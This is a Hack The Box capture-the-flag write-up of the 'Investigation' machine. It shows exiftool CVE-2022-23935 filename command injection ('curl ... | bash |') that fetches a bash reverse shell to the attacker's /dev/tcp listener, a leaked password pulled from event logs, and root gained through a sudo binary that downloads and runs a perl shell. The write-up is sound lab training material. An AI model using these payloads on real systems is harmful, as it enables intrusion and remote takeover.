---
layout: post
title: "HTB: Investigation"
author: Andrew Cherney
date: 2023-04-24 19:38:31
tags: htb medium-box linux webapp ghidra binary-exploitation
icon: "assets/icons/investigation.png"
post_description: "Solving this box can be a bit of an eye opener. Exiftool is normally not thought of as an attack vector but this machine eloquently uses a vulnerable version for a foothold. After a quick grep-ing through some Event Logs user can be obtained. The final piece of the puzzle is dissecting a binary file and running it with sudo to gain root."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Investigation]
└──╼ $nmap -Pn -sC 10.10.11.197
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-26 11:26 CST
Nmap scan report for 10.10.11.197
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 2f:1e:63:06:aa:6e:bb:cc:0d:19:d4:15:26:74:c6:d9 (RSA)
|   256 27:45:20:ad:d2:fa:a7:3a:83:73:d9:7c:79:ab:f3:0b (ECDSA)
|_  256 42:45:eb:91:6e:21:02:06:17:b2:74:8b:c5:83:4f:e0 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://eforenzics.htb/
```

```
echo "10.10.11.197 eforenzics.htb" >> /etc/hosts
```

<h2>Port 80 - http</h2>

{% include img_link src="/img/investigation/Investigation_front_page" alt="front_page" ext="png" trunc=600 %}

![image upload](/img/investigation/Investigation_image_upload.png)

I poke around, upload an image, and realize that once uploaded I am provided the exiftool results from the image.

![exif cat initial](/img/investigation/Investigation_exif_results.png)

I baked some html tags into the exif data but the file it places the results into has a **.txt** extension, which won't let me by render html or other code for that matter. I did manage to find [this exiftool sanitization bypass](https://blog.bricked.tech/posts/exiftool/#the-bug) but there is a core problem where I would need exiftool to parse a specific file before it would let me bypass, likely not the play here. 

<h1>User as www-data</h1>

<h2>CVE-2022-23935</h2>

There is however something to go off here. Exiftool gave us its version which is 12.37 and upon searching for CVEs associated with exiftool [cvedetails notes a vulnerability for <12.38](https://www.cvedetails.com/vulnerability-list.php?vendor_id=19612&product_id=0&version_id=0&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&cweid=0&order=1&trc=2&sha=bf20f9cbf8f5254d3614f7fc965ae0c78f9a125e), convenient that we are one version earlier isn't it. 

[Here is a proof of concept](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429) where it can be demonstrated that these versions of exiftool in question poorly handle special characters in the file name. I can couple this with hosting a local server and making index.html a reverse shell for the exiftool bash commands to run. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Investigation]
└──╼ $ls
'curl 10.10.14.14| bash |'   index.html
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Investigation]
└──╼ $cat index.html 
bash -i >& /dev/tcp/10.10.14.14/7777 0>&1
```

Now I upload the file and wait for my shell.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Investigation]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.197] 51828
bash: cannot set terminal process group (956): Inappropriate ioctl for device
bash: no job control in this shell
www-data@investigation:~/uploads/1677444973$ iidd

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<h1>User as </h1>

<h2>Windows Event Logs</h2>

```bash
www-data@investigation:~$ find / -user www-data 2>/dev/null | grep investigation
/usr/local/investigation/analysed_log
www-data@investigation:~$ cd /usr/local/investigation
www-data@investigation:/usr/local/investigation$ ls
Windows Event Logs for Analysis.msg
analysed_log
```

When digging around I find a specific directory and file with us as its owner, that analysed_log file above. In that same directory is a .msg file which is an outlook message which if I had to put money on it contains some Event Logs. I use the msgconvert command from the libemail-outlook-message-perl libemail-sender-perl packages and the message reads:

```
Hi Steve,

Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures. 

Regards.
Tom
```

This is then followed by hundreds of base64 encoded lines. Looking at the attached base64 it seems to be a file named **evtx-logs.zip**, so I take to cyberchef and find the file **security.evtx**. I can then use [this evtx dump repo](https://github.com/omerbenamram/evtx/) to export into both a readible and (more importantly) a greppable format.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Investigation]
└──╼ $./evtx_dump security.evtx -o json > dump
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Investigation]
└──╼ $grep TargetUserName dump | sort -u
      "TargetUserName": "-",
      "TargetUserName": "aanderson",
      "TargetUserName": "AAnderson"
      "TargetUserName": "AAnderson",
      "TargetUserName": "Administrator"
      "TargetUserName": "Administrators"
      "TargetUserName": "AWright"
      "TargetUserName": "Backup Operators"
      "TargetUserName": "BMay"
      "TargetUserName": "DefaultAccount"
      "TargetUserName": "Def@ultf0r3nz!csPa$$",
      "TargetUserName": "DWM-1",
      "TargetUserName": "DWM-2",
    .....
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Investigation]
└──╼ $grep Def@ultf0r3 dump -n
516278:      "TargetUserName": "Def@ultf0r3nz!csPa$$",
516341:      "TargetUserName": "Def@ultf0r3nz!csPa$$",
```

That password is my ticket inside, now only to find who uses it. I do another search for TargetUserName and find that smorton was the next target username to be logged. So I tried it and: 

```
516341:      "TargetUserName": "Def@ultf0r3nz!csPa$$",
516979:      "TargetUserName": "smorton",
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Investigation]
└──╼ $ssh smorton@eforenzics.htb
smorton@investigation:~$ cat user.txt
370a75d548a04f------------------
```

<h1>Root</h1>

<h2>Binary</h2>

```bash
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```

I spin up a python server on the machine and grab that binary for investigation with ghidra. 

```C
{
  __uid_t _Var1;
  int iVar2;
  FILE *__stream;
  undefined8 uVar3;
  char *__s;
  char *__s_00;
  
  if (param_1 != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  _Var1 = getuid();
  if (_Var1 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
  if (iVar2 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Running... ");
  __stream = fopen(*(char **)(param_2 + 0x10),"wb");
  uVar3 = curl_easy_init();
  curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
  curl_easy_setopt(uVar3,0x2711,__stream);
  curl_easy_setopt(uVar3,0x2d,1);
  iVar2 = curl_easy_perform(uVar3);
  if (iVar2 == 0) {
    iVar2 = snprintf((char *)0x0,0,"%s",*(undefined8 *)(param_2 + 0x10));
    __s = (char *)malloc((long)iVar2 + 1);
    snprintf(__s,(long)iVar2 + 1,"%s",*(undefined8 *)(param_2 + 0x10));
    iVar2 = snprintf((char *)0x0,0,"perl ./%s",__s);
    __s_00 = (char *)malloc((long)iVar2 + 1);
    snprintf(__s_00,(long)iVar2 + 1,"perl ./%s",__s);
    fclose(__stream);
    curl_easy_cleanup(uVar3);
    setuid(0);
    system(__s_00);
    system("rm -f ./lDnxUysaQn");
    return 0;
  }
```

The main function here seems to hold all the important bits. In short it checks the user's id for root, then checks for the second parameter to be equal to lDnxUysaQn, it performs some curl commands then will run a perl file supposedly supplied by the first parameter. 

Now let's make a random perl file to determine if the command spits out an error.

```bash
smorton@investigation:~$ sudo binary http://10.10.14.14/perl.pl lDnxUysaQn
Running... 
Exiting...
```

That seems promising, no errors. Let's change that perl file to a shell and try again. The contents are now **system("/bin/bash -p");**

```
smorton@investigation:~$ sudo binary http://10.10.14.14:8000/perl.pl lDnxUysaQn
Running... 
root@investigation:/home/smorton# cat /root/root.txt
f27565b46dd6e1------------------
```
